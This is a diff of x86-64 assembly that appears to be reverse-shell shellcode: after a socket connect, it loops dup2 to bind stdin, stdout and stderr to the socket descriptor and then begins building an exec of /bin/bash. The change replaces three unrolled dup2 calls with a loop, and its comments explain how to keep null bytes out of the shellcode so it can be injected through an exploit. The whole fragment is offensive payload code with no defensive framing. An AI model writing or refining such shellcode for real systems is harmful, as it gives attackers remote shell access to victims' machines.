@@ -27,20 +27,16 @@ _connect:
     mov dl, 0x10
     syscall
 
-    mov al, 63 ; dup2
-    mov rbx, r13
+_dup2:
     xor rcx, rcx ; stdout, set 0 to rcx without using mov rcx, 0 -> which results in 0 bytes in the shellcode
+    mov rbx, r13
+    mov al, 63 ; dup2
     int 0x80
 
-    mov al, 63 ; dup2
-    mov rbx, r13
-    mov cl, 1 ; stdin, use cl instead of rcx, this results in no 0 bytes in the shellcode
-    int 0x80
-
-    mov al, 63 ; dup2
-    mov rbx, r13
-    mov cl, 2 ; stderr, use cl instead of rcx, this results in no 0 bytes in the shellcode
-    int 0x80
+    cmp cl, 3 ; did we reach stderr yet?
+    jz short 0x5 ; if so jump past next instructions, found jmp numbers by inspecting where it wants to jump in objdump -d
+    inc cl ; increment cl so that it becomes, 1 (stdin) -> 2 (stderr)
+    jmp short -12 ; jump back to dup2, found jmp numbers by inspecting where it wants to jump in objdump -d
 
     ; prepare execing bin/bash
     mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
